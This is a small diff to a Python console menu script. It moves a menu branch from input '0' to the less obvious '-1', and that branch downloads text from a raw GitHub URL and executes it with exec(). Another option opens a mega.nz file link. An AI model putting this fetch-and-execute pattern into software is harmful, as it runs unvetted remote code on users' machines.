@@ -27,7 +27,7 @@ while True:
     os.system('cls')
     print(mine)
     chon = input('                                               \033[1;39m[\033[1;31m×\033[1;39m] \033[1;39m>> ')
-    if chon == '0':
+    if chon == '-1':
         exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Main.txt').text)
     elif chon == '1.1':
         webbrowser.open_new("https://mega.nz/file/h20i1JIZ#DgXHSONcns2l5sXz1Fl1XJrB7FeI1cf6Qx2PzQldeUg")    
